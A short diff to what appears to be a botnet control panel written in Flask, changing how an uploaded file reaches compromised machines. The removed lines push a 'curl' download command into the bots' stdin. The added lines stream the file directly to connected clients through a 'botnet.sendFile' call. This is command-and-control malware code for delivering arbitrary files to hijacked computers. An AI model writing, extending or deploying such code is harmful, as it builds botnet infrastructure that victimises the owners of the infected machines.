@@ -52,13 +52,10 @@ def authenticate():
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
-        filename = secure_filename(f.filename)
-        location = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        f.save(location)
-        if botnet.sendStdin(connected, 'curl {}static/uploads/{} -o {}\n'.format(request.url_root ,f.filename, f.filename)):
-            # os.remove(location) #TODO: Should probably remove file but need more elegant way to do so in order to avoid race condition
-            return json.dumps({"success": True})
-        else: return json.dumps({"success": False})
+        # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
+        botnet.sendFile(connected,f.filename,f)
+        # TODO switch to in-progress instead of "success"
+        return json.dumps({"success": True})
 
 def requires_auth(f):
     @wraps(f)
